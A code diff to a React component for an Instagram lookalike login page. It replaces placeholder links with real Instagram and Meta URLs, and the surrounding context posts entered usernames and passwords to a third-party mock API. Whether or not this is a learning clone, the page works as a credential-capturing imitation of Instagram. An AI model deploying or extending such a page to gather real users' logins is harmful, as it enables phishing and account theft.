@@ -24,7 +24,7 @@ function App() {
 
     const{ username ,password} =AddUserdata
     if(username && password ){
-   const result = await axios.post(
+   await axios.post(
   "https://6ac88a8dfd7c536b1bd94092.mockapi.io/UserApi/Userlogin",
   AddUserdata
 );
@@ -89,15 +89,15 @@ function App() {
                 </div>
                 <div className="login-with-fb flex direction-column align-items-center">
                     <div>
-                        <img />
-                        <a>Log in with Facebook</a>
+                        <img alt="" />
+                        <a href="https://www.facebook.com/login/">Log in with Facebook</a>
                     </div>
-                    <a href="#">Forgot password?</a>
+                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                 </div>
             </div>
             <div className="panel register flex justify-content-center">
                 <p>Don’t have an account?</p>
-                <a href="#">Sign up</a>
+                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
             </div>
             <div className="app-download flex direction-column align-items-center">
                 <p>Get the app.</p>
@@ -110,17 +110,17 @@ function App() {
     </main>
     <footer>
         <ul className="flex flex-wrap justify-content-center">
-            <li><a href="#">ABOUT</a></li>
-            <li><a href="#">HELP</a></li>
-            <li><a href="#">PRESS</a></li>
-            <li><a href="#">API</a></li>
-            <li><a href="#">JOBS</a></li>
-            <li><a href="#">PRIVACY</a></li>
-            <li><a href="#">TERMS</a></li>
-            <li><a href="#">LOCATIONS</a></li>
-            <li><a href="#">TOP ACCOUNTS</a></li>
-            <li><a href="#">HASHTAGS</a></li>
-            <li><a href="#">LANGUAGE</a></li>
+            <li><a href="https://about.instagram.com/">ABOUT</a></li>
+            <li><a href="https://help.instagram.com/">HELP</a></li>
+            <li><a href="https://about.instagram.com/blog/">PRESS</a></li>
+            <li><a href="https://developers.facebook.com/docs/instagram-platform/">API</a></li>
+            <li><a href="https://www.metacareers.com/">JOBS</a></li>
+            <li><a href="https://privacycenter.instagram.com/policy/">PRIVACY</a></li>
+            <li><a href="https://help.instagram.com/581066165581870/">TERMS</a></li>
+            <li><a href="https://www.instagram.com/explore/locations/">LOCATIONS</a></li>
+            <li><a href="https://www.instagram.com/explore/">TOP ACCOUNTS</a></li>
+            <li><a href="https://www.instagram.com/explore/tags/">HASHTAGS</a></li>
+            <li><a href="https://help.instagram.com/111923612310997/">LANGUAGE</a></li>
         </ul>
         <p className="copyright">© 2020 Instagram from Facebook</p>
     </footer>
